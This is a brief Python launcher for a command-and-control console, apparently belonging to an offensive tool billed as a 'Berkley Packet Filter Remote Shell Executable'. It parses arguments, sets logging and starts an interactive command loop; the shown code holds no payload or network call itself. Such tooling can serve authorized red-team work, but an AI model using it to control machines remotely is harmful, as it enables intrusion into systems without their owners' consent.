import logging
from c2.c2_cmd import C2Cmd
from c2.view import C2View
from c2.parse import get_command_args
from c2.c2 import C2


def start_c2() -> None:
    args = get_command_args()
    if args.debug:
        log_level = logging.DEBUG
    else:
        log_level = logging.INFO

    c2 = C2(args, log_level)

    c2_cmd = C2Cmd(stdout=c2.view)
    c2_cmd.c2 = c2
    intro = C2View.colored_text(
        "Berkley Packet Filter Remote Shell Executable \nUse 'help' to see available commands\n\n\n",
        "05A8AA",
    )

    # Print the intro message without logging
    print(intro)
    c2.view.print_debug("Starting C2 in debug mode")
    c2_cmd.cmdloop()


if __name__ == "__main__":
    start_c2()
